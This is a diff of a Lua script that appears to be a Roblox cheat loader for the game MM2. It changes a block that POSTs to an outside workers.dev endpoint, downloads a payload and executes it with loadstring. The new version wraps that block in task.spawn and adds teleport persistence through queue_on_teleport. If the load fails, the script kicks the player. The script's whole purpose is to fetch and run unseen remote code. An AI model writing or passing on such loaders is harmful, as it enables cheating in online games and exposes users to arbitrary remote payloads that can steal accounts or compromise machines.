@@ -16,11 +16,14 @@ end
 
 CFG.game = game_name
 
-local ok, err = pcall(function()
-    local res = request({ Url = "https://mm2-backend.tikitikiphonkisbetterthenyarayara.workers.dev/payload?g=" .. CFG.game, Method = "POST" })
-    loadstring(res.Body)()
-end)
+if queue_on_teleport then getgenv().queue_on_teleport = queue_on_teleport end
 
-if not ok then
-    game:GetService("Players").LocalPlayer:Kick("Failed to load. Rejoin and try again.")
-end
+task.spawn(function()
+    local ok, err = pcall(function()
+        local res = request({ Url = "https://mm2-backend.tikitikiphonkisbetterthenyarayara.workers.dev/payload?g=" .. CFG.game, Method = "POST" })
+        loadstring(res.Body)()
+    end)
+    if not ok then
+        game:GetService("Players").LocalPlayer:Kick("Failed to load. Rejoin and try again.")
+    end
+end)
